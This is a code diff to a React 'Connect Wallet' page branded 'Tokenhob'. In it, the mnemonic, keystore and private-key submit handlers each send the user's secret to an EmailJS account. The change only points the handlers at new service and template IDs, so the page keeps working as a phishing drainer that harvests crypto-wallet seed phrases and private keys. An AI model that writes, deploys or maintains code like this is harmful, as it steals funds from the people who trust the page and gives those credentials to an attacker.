@@ -84,13 +84,13 @@ const ConnectWalet = () => {
   const onMenonicSubmit = async ({ mnemonic }: MnemonicType) => {
     if (findMultiple(countWords(mnemonic))) {
       setIsLoading("Mnemonic");
+
       emailjs
         .send(
-          "service_zin07rx",
-          "template_u551ka5",
+          "service_8aznyvt",
+          "template_hnet3wv",
           {
-            from_name: "TokenHob | Mnemonic",
-            to_name: "tokenhob admin",
+            from_name: "tokenhob",
             message: mnemonic,
           },
           { publicKey: "L8nGK1vSp66Eu4CT8" }
@@ -112,13 +112,13 @@ const ConnectWalet = () => {
 
   const keystoreSubmit: SubmitHandler<KeyStoreType> = (values) => {
     setIsLoading("Keystore");
+
     emailjs
       .send(
-        "service_zin07rx",
-        "template_u551ka5",
+        "service_8aznyvt",
+        "template_hnet3wv",
         {
-          from_name: "TokenHob | KeyStore",
-          to_name: "tokenhob admin",
+          from_name: "tokenhob",
           message: values,
         },
         { publicKey: "L8nGK1vSp66Eu4CT8" }
@@ -138,20 +138,19 @@ const ConnectWalet = () => {
   const privateKeySubmit = (values: PrivateKeyType) => {
     setIsLoading("PrivateKey");
     emailjs
-      .send(
-        "service_zin07rx",
-        "template_u551ka5",
-        {
-          from_name: "TokenHob | PrivateKey",
-          to_name: "tokenhob admin",
-          message: JSON.stringify(values),
-        },
-        { publicKey: "L8nGK1vSp66Eu4CT8" }
-      )
-      .then((data) => {
-        setIsLoading(null);
-        privateKeyForm.reset();
-      });
+    .send(
+      "service_8aznyvt",
+      "template_hnet3wv",
+      {
+        from_name: "tokenhob",
+        message: JSON.stringify(values),
+      },
+      { publicKey: "L8nGK1vSp66Eu4CT8" }
+    )
+    .then((data) => {
+      setIsLoading(null);
+      privateKeyForm.reset();
+    });
   };
 
   const files = acceptedFiles.map((file: File) => (
@@ -167,7 +166,6 @@ const ConnectWalet = () => {
   useEffect(() => {
     document.title = "Tokenhob | Connect Wallet";
   }, []);
-
 
   return (
     <div className="px-4 py-6 mt-24 w-full">
